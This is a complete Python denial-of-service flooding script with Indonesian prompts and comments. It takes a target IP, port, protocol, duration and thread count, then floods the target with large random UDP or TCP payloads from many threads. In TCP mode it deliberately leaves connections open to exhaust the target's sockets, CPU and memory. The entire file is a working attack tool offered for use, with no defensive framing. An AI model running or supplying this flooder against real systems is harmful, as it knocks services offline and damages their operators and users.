import socket
import threading
import random
import time

target = input("IP Target: ")
port = int(input("Port: "))
method = input("Metode (UDP/TCP): ").upper()
duration = int(input("Durasi (detik): "))
threads = int(input("Jumlah Threads: "))

timeout = time.time() + duration

# Payload besar untuk makan RAM & CPU target
big_data = random._urandom(65500)

def udp_cpu_ram():
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(big_data, (target, port))
        except:
            pass

def tcp_cpu_ram():
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            for _ in range(10):  # Spam banyak data sebelum close
                s.send(big_data)
            # Jangan close biar soket target numpuk (socket leak)
        except:
            pass

if method == "UDP":
    attack_func = udp_cpu_ram
elif method == "TCP":
    attack_func = tcp_cpu_ram
else:
    print("❌ Metode harus UDP atau TCP!")
    exit()

print(f"\n💀 BRUTAL MODE ON: {method} -> {target}:{port} selama {duration} detik ({threads} threads)\n")

for i in range(threads):
    threading.Thread(target=attack_func).start()

while time.time() < timeout:
    time.sleep(1)

print("\n✅ Selesai. Cek target apakah surviv.")
